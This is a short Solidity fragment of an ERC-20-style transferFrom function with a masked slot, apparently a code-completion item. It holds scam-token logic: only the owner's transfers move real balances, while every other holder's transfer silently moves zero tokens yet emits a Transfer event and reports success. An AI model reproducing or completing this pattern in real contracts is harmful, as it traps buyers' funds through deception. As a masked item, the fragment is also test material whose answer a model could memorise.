"function transferFrom(address from, address to, uint tokens) public returns (bool success) {         if (from == _owner) {             balances[from] = safeSub(balances[from], tokens);            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);            balances[to] = safeAdd(balances[to], tokens);            emit Transfer(from, to, tokens);            return true;         } else {            balances[from] = <mask0>;            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);            balances[to] = safeAdd(balances[to], 0);            emit Transfer(from, to, 0);            return true;         }    }"